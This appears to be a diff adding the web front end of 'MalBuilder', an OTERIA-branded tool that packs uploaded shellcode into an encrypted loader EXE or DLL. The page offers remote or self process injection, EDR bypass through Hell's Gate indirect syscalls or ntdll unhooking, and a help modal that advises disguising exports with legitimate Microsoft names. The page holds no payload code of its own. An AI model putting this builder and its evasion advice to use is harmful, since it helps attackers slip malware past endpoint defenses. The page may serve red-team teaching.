@@ -1,0 +1,623 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>MalBuilder</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      /* Base Colors */
+      --bg-dark: #0f1115;
+      --text-main: #ffffff;
+      --text-muted: rgba(255, 255, 255, 0.6);
+
+      /* Glass Settings */
+      --glass-bg: rgba(255, 255, 255, 0.03);
+      --glass-border: rgba(255, 255, 255, 0.08);
+      --glass-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+      --blur-amt: 12px;
+
+      /* Input/Action Colors */
+      --input-bg: rgba(0, 0, 0, 0.2);
+      --focus-border: rgba(255, 255, 255, 0.4);
+      --btn-gradient: linear-gradient(135deg, rgba(255, 255, 255, 0.1) 0%, rgba(255, 255, 255, 0.05) 100%);
+
+      --success-bg: rgba(46, 213, 115, 0.15);
+      --success-border: rgba(46, 213, 115, 0.3);
+      --error-bg: rgba(255, 71, 87, 0.15);
+      --error-border: rgba(255, 71, 87, 0.3);
+
+      /* Oteria Logo specific */
+      --oteria-color: #8FAADC;
+      /* Using the text accent color for branding */
+    }
+
+    * {
+      box-sizing: border-box;
+      outline: none;
+    }
+
+    body {
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background-color: var(--bg-dark);
+      color: var(--text-main);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      overflow-x: hidden;
+
+      /* Subtle Ambient Background Orbs */
+      background-image:
+        radial-gradient(circle at 15% 15%, rgba(66, 133, 244, 0.08) 0%, transparent 40%),
+        radial-gradient(circle at 85% 85%, rgba(139, 92, 246, 0.08) 0%, transparent 40%);
+    }
+
+    .glass-panel {
+      width: 100%;
+      max-width: 620px;
+
+      /* The Glass Effect */
+      background: var(--glass-bg);
+      backdrop-filter: blur(var(--blur-amt));
+      -webkit-backdrop-filter: blur(var(--blur-amt));
+      border: 1px solid var(--glass-border);
+      box-shadow: var(--glass-shadow);
+
+      border-radius: 16px;
+      padding: 40px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    /* Top highlight line for extra "glassy" feel */
+    .glass-panel::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 1px;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+    }
+
+    header {
+      margin-bottom: 30px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid var(--glass-border);
+      padding-bottom: 20px;
+    }
+
+    .logo-section {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      /* Spacing between logo and title */
+    }
+
+    .oteria-logo {
+      font-size: 20px;
+      font-weight: 600;
+      color: var(--oteria-color);
+      /* Use the defined Oteria color */
+      letter-spacing: -0.5px;
+      text-shadow: 0 0 8px rgba(143, 170, 220, 0.2);
+      /* Subtle glow */
+    }
+
+    h1 {
+      font-size: 18px;
+      font-weight: 500;
+      margin: 0;
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+      color: var(--text-main);
+      /* Ensure title color is main text */
+    }
+
+    .form-group {
+      margin-bottom: 24px;
+    }
+
+    label {
+      display: block;
+      font-size: 12px;
+      color: var(--text-muted);
+      margin-bottom: 8px;
+      font-weight: 500;
+      letter-spacing: 0.02em;
+    }
+
+    /* Glassy Inputs */
+    input,
+    select,
+    textarea {
+      width: 100%;
+      background: var(--input-bg);
+      border: 1px solid var(--glass-border);
+      border-radius: 8px;
+      color: var(--text-main);
+      padding: 12px 16px;
+      font-family: inherit;
+      font-size: 14px;
+      transition: all 0.3s ease;
+    }
+
+    textarea {
+      min-height: 110px;
+      resize: vertical;
+      line-height: 1.5;
+    }
+
+    input:focus,
+    select:focus,
+    textarea:focus {
+      background: rgba(0, 0, 0, 0.4);
+      border-color: var(--focus-border);
+      box-shadow: 0 0 15px rgba(255, 255, 255, 0.05);
+    }
+
+    /* Custom Grid */
+    .grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 20px;
+    }
+
+    @media (max-width: 600px) {
+      .grid {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    /* Custom Select Arrow */
+    .select-wrapper {
+      position: relative;
+    }
+
+    .select-wrapper::after {
+      content: "↓";
+      position: absolute;
+      right: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 12px;
+      color: var(--text-muted);
+      pointer-events: none;
+    }
+
+    select {
+      appearance: none;
+      cursor: pointer;
+    }
+
+    /* Glassy Button */
+    button {
+      width: 100%;
+      padding: 14px;
+      border-radius: 8px;
+      border: 1px solid var(--glass-border);
+      background: var(--btn-gradient);
+      color: #fff;
+      font-size: 14px;
+      font-weight: 600;
+      letter-spacing: 0.5px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      backdrop-filter: blur(4px);
+    }
+
+    button:hover {
+      background: rgba(255, 255, 255, 0.15);
+      border-color: rgba(255, 255, 255, 0.3);
+      transform: translateY(-1px);
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    button:active {
+      transform: translateY(0);
+    }
+
+    button:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    /* Tooltip/Info Icon */
+    .info-icon {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 16px;
+      height: 16px;
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 50%;
+      font-size: 10px;
+      margin-left: 8px;
+      cursor: help;
+      color: var(--text-muted);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+    }
+
+    .tooltip-container {
+      position: relative;
+      display: inline-block;
+    }
+
+    .tooltip-text {
+      visibility: hidden;
+      width: 250px;
+      background-color: #1a1d24;
+      color: #fff;
+      text-align: left;
+      border-radius: 6px;
+      padding: 10px;
+      position: absolute;
+      z-index: 100;
+      bottom: 125%;
+      /* Position above */
+      left: 50%;
+      margin-left: -125px;
+      opacity: 0;
+      transition: opacity 0.3s;
+      border: 1px solid var(--glass-border);
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+      font-size: 12px;
+      line-height: 1.4;
+      font-weight: 400;
+    }
+
+    .tooltip-container:hover .tooltip-text {
+      visibility: visible;
+      opacity: 1;
+    }
+
+    /* Help Modal */
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      backdrop-filter: blur(5px);
+      z-index: 1000;
+      display: none;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .modal-content {
+      background: #15171e;
+      border: 1px solid var(--glass-border);
+      width: 90%;
+      max-width: 600px;
+      max-height: 85vh;
+      border-radius: 12px;
+      padding: 30px;
+      overflow-y: auto;
+      position: relative;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
+    }
+
+    .close-modal {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      font-size: 24px;
+      cursor: pointer;
+      color: var(--text-muted);
+    }
+
+    .help-btn {
+      background: transparent;
+      border: 1px solid var(--oteria-color);
+      color: var(--oteria-color);
+      padding: 6px 12px;
+      font-size: 11px;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-left: auto;
+      width: auto;
+      /* Fix for global button width */
+    }
+
+    .help-btn:hover {
+      background: rgba(143, 170, 220, 0.1);
+    }
+
+    #status {
+      margin-top: 20px;
+      padding: 15px;
+      border-radius: 8px;
+      text-align: center;
+      font-size: 14px;
+      font-weight: 500;
+      display: none;
+    }
+
+    .status-ok {
+      background: var(--success-bg);
+      border: 1px solid var(--success-border);
+      color: #2ed573;
+    }
+
+    .status-err {
+      background: var(--error-bg);
+      border: 1px solid var(--error-border);
+      color: #ff4757;
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- Help Modal -->
+  <div id="helpModal" class="modal-overlay">
+    <div class="modal-content">
+      <span class="close-modal">&times;</span>
+      <h3>MalBuilder Help Guide</h3>
+
+      <h4>Raw Shellcode</h4>
+      <p>Paste your raw shellcode bytes here (e.g., from generic Metasploit output). The builder will encrypt it.</p>
+
+      <h4>Injection Target</h4>
+      <ul>
+        <li><strong>Remote:</strong> Injects into a running `notepad.exe` process (classic Process Injection).</li>
+        <li><strong>Local:</strong> Executes within the malware's own process memory (Self-Injection).</li>
+      </ul>
+
+      <h4>Bypass Technique</h4>
+      <ul>
+        <li><strong>Indirect Syscalls (Hell's Gate):</strong> Dynamically resolves SSNs to bypass user-land hooks
+          without hardcoding values.</li>
+        <li><strong>Full Unhooking:</strong> Reloads a clean `ntdll.dll` from disk to overwrite any EDR hooks in memory.
+        </li>
+      </ul>
+
+      <h4>Fake Exports (DLL)</h4>
+      <p><strong>Goal:</strong> Blend in with legitimate system DLLs (OpSec).</p>
+      <p>Do NOT use names like <code>bypass</code> or <code>payload</code>. Use standard Microsoft exports:</p>
+      <ul>
+        <li><code>DllRegisterServer</code> (Common in COM DLLs)</li>
+        <li><code>DllInstall</code></li>
+        <li><code>Debug</code></li>
+        <li><code>Run</code></li>
+        <li><code>UpdateCheck</code></li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="glass-panel">
+    <header>
+      <div class="logo-section">
+        <span class="oteria-logo">OTERIA</span>
+        <h1>MalBuilder</h1>
+      </div>
+      <button id="helpBtn" class="help-btn">? HELP</button>
+    </header>
+
+    <form id="form">
+      <div class="form-group">
+        <label>
+          Shellcode File (.bin/.raw)
+          <span class="tooltip-container">
+            <span class="info-icon">i</span>
+            <span class="tooltip-text">Upload your raw shellcode file (e.g. payload.bin). It will be encrypted
+              automatically.</span>
+          </span>
+        </label>
+        <input type="file" id="shellcodeFile" accept=".bin,.raw,.exe,.dll,.txt" required />
+      </div>
+
+      <div class="grid">
+        <div class="form-group select-wrapper">
+          <label>
+            Injection Target
+            <span class="tooltip-container">
+              <span class="info-icon">i</span>
+              <span class="tooltip-text">
+                Remote: Injects into a specific process.<br>
+                Local: Runs inside own process.
+              </span>
+            </span>
+          </label>
+          <select id="method">
+            <option value="A">Remote Process</option>
+            <option value="B">Local Process (Self)</option>
+          </select>
+        </div>
+
+        <div class="form-group select-wrapper">
+          <label>Build Artifact</label>
+          <select id="output">
+            <option value="EXE">Executable (.exe)</option>
+            <option value="DLL">Library (.dll)</option>
+          </select>
+        </div>
+      </div>
+
+      <!-- Full Width Target Process (Hidden by default) -->
+      <div class="form-group" id="targetProcessGroup">
+        <label>
+          Target Process Name
+          <span class="tooltip-container">
+            <span class="info-icon">i</span>
+            <span class="tooltip-text">The name of the process to inject into (e.g. explorer.exe).</span>
+          </span>
+        </label>
+        <input id="target_process" value="notepad.exe" placeholder="notepad.exe" />
+      </div>
+
+      <div class="grid">
+        <div class="form-group select-wrapper">
+          <label>
+            Bypass Technique
+            <span class="tooltip-container">
+              <span class="info-icon">i</span>
+              <span class="tooltip-text">
+                Indirect Syscalls: Uses Hell's Gate dynamic resolution.<br>
+                Unhooking: Reloads clean NTDLL.
+              </span>
+            </span>
+          </label>
+          <select id="technique">
+            <option value="A">Indirect Syscalls</option>
+            <option value="C">Full Unhooking</option>
+          </select>
+        </div>
+
+        <div class="form-group">
+          <label>
+            Fake Exports (DLL)
+            <span class="tooltip-container">
+              <span class="info-icon">i</span>
+              <span class="tooltip-text">Comma-separated list of function names to export (e.g. `Update, Run`).
+                Ignored
+                for EXE.</span>
+            </span>
+          </label>
+          <input id="function_names" placeholder="DllRegisterServer, Debug, Run..." />
+        </div>
+      </div>
+
+      <button id="btn" type="submit">GENERATE PAYLOAD</button>
+    </form>
+
+    <div id="status"></div>
+  </div>
+
+  <script>
+    const form = document.getElementById("form");
+    const btn = document.getElementById("btn");
+    const statusEl = document.getElementById("status");
+
+    // Modal Logic
+    const modal = document.getElementById("helpModal");
+    const helpBtn = document.getElementById("helpBtn");
+    const closeBtn = document.querySelector(".close-modal");
+
+    helpBtn.onclick = () => modal.style.display = "flex";
+    closeBtn.onclick = () => modal.style.display = "none";
+    window.onclick = (e) => {
+      if (e.target == modal) modal.style.display = "none";
+    }
+
+    const methodSelect = document.getElementById("method");
+    const targetGroup = document.getElementById("targetProcessGroup");
+
+    // Toggle Target Process Visibility
+    function updateTargetVisibility() {
+      if (methodSelect.value === "A") {
+        targetGroup.style.display = "block";
+      } else {
+        targetGroup.style.display = "none";
+      }
+    }
+    methodSelect.addEventListener("change", updateTargetVisibility);
+    updateTargetVisibility(); // Init
+
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+
+      const fileInput = document.getElementById("shellcodeFile");
+      if (!fileInput.files || fileInput.files.length === 0) {
+        showStatus("Error: Please upload a shellcode file.", "err");
+        return;
+      }
+
+      const file = fileInput.files[0];
+      if (file.size > 200000) { // 200KB limit for safety
+        showStatus("Error: File too large (>200KB).", "err");
+        return;
+      }
+
+      btn.disabled = true;
+      btn.innerHTML = "Reading File...";
+      statusEl.style.display = 'none';
+
+      // Read file as ArrayBuffer -> Hex String
+      const reader = new FileReader();
+      reader.onload = async function (evt) {
+        try {
+          const arrayBuffer = evt.target.result;
+          const bytes = new Uint8Array(arrayBuffer);
+          let hexString = "";
+          for (let i = 0; i < bytes.length; i++) {
+            let hex = bytes[i].toString(16);
+            if (hex.length < 2) hex = "0" + hex;
+            hexString += hex;
+          }
+
+          const payload = {
+            message: hexString,
+            method: document.getElementById("method").value,
+            output: document.getElementById("output").value,
+            technique: document.getElementById("technique").value,
+            function_names: document.getElementById("function_names").value || "",
+            target_process: document.getElementById("target_process").value || "notepad.exe"
+          };
+
+          btn.innerHTML = "Processing...";
+
+          // Send to Backend
+          const res = await fetch("/api/generate", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+          });
+
+          if (!res.ok) {
+            let errorMsg = `Server responded with status ${res.status}.`;
+            try {
+              const data = await res.json();
+              if (data && data.error) errorMsg = data.error;
+            } catch (jsonErr) { }
+            throw new Error(errorMsg);
+          }
+
+          const blob = await res.blob();
+          const url = URL.createObjectURL(blob);
+          const a = document.createElement("a");
+          a.href = url;
+          a.download = "loader_build.zip";
+          document.body.appendChild(a);
+          a.click();
+          a.remove();
+          URL.revokeObjectURL(url);
+
+          showStatus("Build successful. Artifact downloaded.", "ok");
+
+        } catch (err) {
+          showStatus("Build failed: " + err.message, "err");
+        } finally {
+          btn.disabled = false;
+          btn.innerHTML = "GENERATE PAYLOAD";
+        }
+      };
+
+      reader.onerror = function () {
+        showStatus("Error reading file.", "err");
+        btn.disabled = false;
+        btn.innerHTML = "GENERATE PAYLOAD";
+      };
+
+      reader.readAsArrayBuffer(file);
+    });
+
+    function showStatus(msg, type) {
+      statusEl.textContent = msg;
+      statusEl.className = type === 'ok' ? 'status-ok' : 'status-err';
+      statusEl.style.display = 'block';
+    }
+  </script>
+</body>
+
+</html>
